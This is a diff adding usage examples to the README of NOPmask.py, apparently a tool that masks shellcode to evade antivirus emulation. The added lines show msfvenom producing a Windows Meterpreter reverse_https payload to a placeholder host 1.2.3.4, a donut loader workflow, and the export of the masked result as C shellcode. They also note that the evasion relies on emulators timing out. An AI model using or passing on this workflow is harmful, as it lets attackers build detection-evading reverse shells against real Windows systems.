@@ -48,6 +48,25 @@ Basic usage example:
 python NOPmask.py -a amd64 -i shellcode.bin -o masked_shellcode.bin -f binary
 ```
 
+Example of using with msfvenom:
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f raw -o raw_shellcode.bin
+python NOPmask.py -a amd64 -i raw_shellcode.bin -o masked_shellcode.bin -f binary
+msfvenom -p generic/custom PAYLOADFILE=masked_shellcode.bin -f C -v shellcode -o masked_shellcode.c
+```
+
+Example of using with donut:
+```bash
+donut.exe -i reverse_https.dll -a 2
+python NOPmask.py -a amd64 -i loader.bin -o masked_loader.bin -f binary
+msfvenom -p generic/custom PAYLOADFILE=masked_loader.bin -f C -v shellcode -o masked_shellcode.c
+```
+
+### Warnings
+
+1. The decryption stub alters the memory space that the shellcode is executed within, and therefore the memory space allocated for the shellcode must have Read/Write/Execution permissions.
+2. The emulation evasion technique employed here exploits the fact that emulators are not patient, they will try to rush the emulation to not let the user wait, so please allow up to a minute for your shellcode to execute.
+
 ---
 
 ## Attribution
